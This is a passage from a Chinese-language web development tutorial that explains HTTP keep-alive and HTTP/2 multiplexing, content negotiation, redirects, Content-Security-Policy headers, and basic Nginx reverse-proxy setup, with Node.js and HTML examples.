punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test2.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test3.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test4.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test6.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/test7.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="image-20210125151346961.png" alt="查看Network" style="zoom:90%;"><img src="image-20210125152325682.png" alt="等待" style="zoom:90%;"><p>此时<code>Connection:keep-alive</code>，可以看到Chrome浏览器支持6个并发的连接，其他的图片在等待，等待有TCP连接空出来再发送请求</p><p>如果<code>Connection:close</code>,TCP连接不会复用，可以看到每个Connection ID都不一样</p><img src="image-20210125152745803.png" alt="短连接" style="zoom:90%;"><p>访问使用HTTP2的Google页面，发现只用了一个Connection ID</p><img src="image-20210125153633792.png" alt="" style="zoom:90%;"><blockquote><p>HTTP2可以信道复用，在TCP连接上可以并发的去发送http请求，链接一个网站只需要一个TCP链接(同域的情况下)</p></blockquote><p>参考文章：<a href="https://www.cnblogs.com/gotodsp/p/6366163.html">HTTP长连接、短连接</a></p><p>​<br>​</p><h3 id="2-7-数据协商">2.7 数据协商</h3><p>  在客户端发送给服务端一个请求时，会声明希望拿到的数据格式以及数据相关的一些限制，服务端会根据这个请求进行判断，返回不同的数据（服务端是根据客户端发送的请求头信息来进行区分，然后服务端决定返回怎么样的数据）</p><h4 id="请求">请求</h4><p><strong>Accept：</strong></p><ul><li>Accept：表示想要的数据类型</li><li>Accept-Encoding：代表数据使用什么样的编码方式进行传输</li><li>Accept-Language：实现不同的地方访问服务展示的语言不同</li><li>User-Agent：表示浏览器相关的信息，手机端的浏览器和PC端的浏览器是不一样的，可以通过User-Agent判断</li></ul><h4 id="返回">返回</h4><p><strong>Content：</strong></p><ul><li>Content-Type：对应Accept，Accept可以接收几种数据格式，Content-Type从其中选择一种</li><li>Content-Encoding：对应Accept-Encoding</li><li>Content-language：根据你的请求返回语言还是没有根据请求返回语言</li></ul><p><code>Content-Type</code></p><ul><li><p>application/x-www-form-urlencoded：数据被编码为名称/值对。这是标准的编码格式</p></li><li><p>multipart/form-data： 数据被编码为一条消息，页上的每个控件对应消息中的一个部分</p></li><li><p>text/plain： 数据以纯文本形式（text/json/xml/html）进行编码，其中不含任何控件或格式字符</p><p>…</p></li></ul><blockquote><p>当你想要设置你想要的数据时就通过设置Accept中的属性来达到，服务端就会根据你的请求来进行对应的请求</p></blockquote><p><img src="image-20210126153300531.png" alt=""></p><p>​<br>​</p><h3 id="2-8-Redirect">2.8 Redirect</h3><p>  我们通过url去访问一个路径，请求资源的时候，发现这个资源已经不在这个url指定的位置了，这时候服务器就会告诉客户端浏览器，请求的资源现在在那个地方，浏览器再去重新请求那个地方</p><p>通过服务器判断请求的路径来实现重定向到新的url，一般返回3**有几种状态：</p><ul><li>302（每次访问都需要通过旧的url再跳转到新的资源的URL上）</li><li>301（指定之前的资源的路径永久变成了新定义的资源路径，出现了之前路径访问的时候，直接在浏览器就会变成新的路径，就不需要服务器去指定一个新的location，因为是一个永久的变更；除非主动清除缓存，不然浏览器都会默认调整）</li></ul><p>示例代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">302</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Location'</span><span class="token operator">:</span> <span class="token string">'/new'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/new'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'&lt;div&gt;this is content&lt;/div&gt;'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126165112534.png" alt=""></p><p><img src="image-20210126165723871.png" alt="重定向"></p><p>​<br>​</p><h3 id="2-9-Content-Security-Policy">2.9 Content-Security-Policy</h3><p><strong>内容安全策略</strong>，为了让网站变得更加的安全</p><ul><li>限制资源获取</li><li>报告资源获取越权</li></ul><p>限制方式：</p><ul><li>default-src限制全局（与链接有关的都可以限制它的作用范围）</li><li>制定资源类型（可以根据特定的资源来限制它的资源范围）</li></ul><p>资源类型（网页上跟链接有关的，需要从外链进行加载内容，都可以进行资源类型的限制）</p><ul><li><p>connect-src（请求发向的地方目标）</p></li><li><p>mainfest-src</p></li><li><p>img-src（图片可以从哪几个网站加载）</p></li><li><p>font-src</p></li><li><p>media-src</p></li><li><p>style-src（样式从哪几个网址加载）</p></li><li><p>frame-src</p></li><li><p>script-src（脚本从哪几个网址加载）</p><p>…</p></li></ul><p>示例代码</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>      <span class="token string">'Content-Security-Policy'</span><span class="token operator">:</span> <span class="token string">'default-src http: https:'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>This is content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'inline js'</span><span class="token punctuation">)</span> <span class="token comment">// 不希望有inline js</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126171420934.png" alt="禁止执行inline js"></p><p>使用外链的方式加载 js 代码，进行测试，此时可以加载</p><p>设置为只能使用本域名下的  js 代码进行加载，进行测试</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>url<span class="token punctuation">)</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span>url <span class="token operator">===</span> <span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">,</span> <span class="token string">'utf8'</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>      <span class="token string">'Content-Security-Policy'</span><span class="token operator">:</span> <span class="token string">'default-src \'self\''</span> <span class="token comment">// 限制所有外链</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span>  <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>      <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'application/javascript'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>    response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token string">'console.log("loaded script")'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>This is content<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'inline js'</span><span class="token punctuation">)</span>  </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>test.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://cdn.bootcss.com/jquery/3.3.1/core.js<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="image-20210126172831056.png" alt=""></p><p><img src="image-20210126173450739.png" alt="blocked:csp"></p><p>限制表单</p><pre class="line-numbers language-none"><code class="language-none">'Content-Security-Policy': 'default-src \'self\'; form-action \'self\' <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210126174415329.png" alt=""></p><p>主动向服务器发请求汇报，可以允许加载（Content-Security-Policy-Report-Only）</p><pre class="line-numbers language-none"><code class="language-none">'Content-Security-Policy': 'default-src \'self\'; form-action \'self\'; report-uri /report'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="image-20210126175140576.png" alt=""></p><p>可以通过meta标签使用</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src <span class="token punctuation">'</span>self<span class="token punctuation">'</span>; form-action <span class="token punctuation">'</span>self<span class="token punctuation">'</span>;<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>参考文章：<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP">CSP</a></p><p>​</p><p>​</p><p>​</p><h2 id="3-Nginx代理基础">3. Nginx代理基础</h2><h3 id="3-1-Nginx安装">3.1 Nginx安装</h3><p>Nginx的作用： 通过一台物理机器可以运行多个服务，节省资源，从而高效地利用计算机</p><p><a href="http://nginx.org/en/download.html">Nginx下载</a></p><img src="image-20210125154517050.png" alt="下载页面" style="zoom: 70%;"><p>直接下载这个页面上的windows压缩包，然后解压，在解压的文件夹中打开git bash来运行nginx</p><img src="image-20210125155122837.png" alt="启动服务" style="zoom:90%;"><img src="image-20210125155100880.png" alt="启动成功" style="zoom:60%;"><p>​<br>​</p><h3 id="3-2-Nginx代理配置">3.2 Nginx代理配置</h3><p>在nginx软件下新建一个servers并创建一个test.conf文件，并且修改<code>nginx.conf</code>，引入<code>test.conf</code>文件：</p><p><code>test.conf</code>：</p><pre class="line-numbers language-none"><code class="language-none">server {  listen      80;  server_name test.com;   location /  {    proxy_pass http://127.0.0.1:8887;    # proxy_set_header Host $host;  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>nginx.conf</code>：（nginx-1.19.6\conf\nginx.conf）</p><pre class="line-numbers language-none"><code class="language-none">include     servers/*.conf;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动server服务</p><p><code>server.js</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> http <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'http'</span><span class="token punctuation">)</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token keyword">const</span> zlib <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'zlib'</span><span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">createServer</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">request<span class="token punctuation">,</span> response</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'request come'</span><span class="token punctuation">,</span> request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>host<span class="token punctuation">)</span>  <span class="token keyword">const</span> html <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'test.html'</span><span class="token punctuation">)</span>  response<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'Content-Type'</span><span class="token operator">:</span> <span class="token string">'text/html'</span><span class="token punctuation">,</span>    <span class="token string">'Content-Encoding'</span><span class="token operator">:</span> <span class="token string">'gzip'</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span>  response<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span>zlib<span class="token punctuation">.</span><span class="token function">gzipSync</span><span class="token punctuation">(</span>html<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span><span class="token number">8887</span><span class="token punctuation">)</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'server listening on 8887'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>width=device-width, initial-scale=1.0<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X-UA-Compatible<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>ie=edge<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>Document<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/form<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>form<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>application/x-www-form-urlencoded<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token 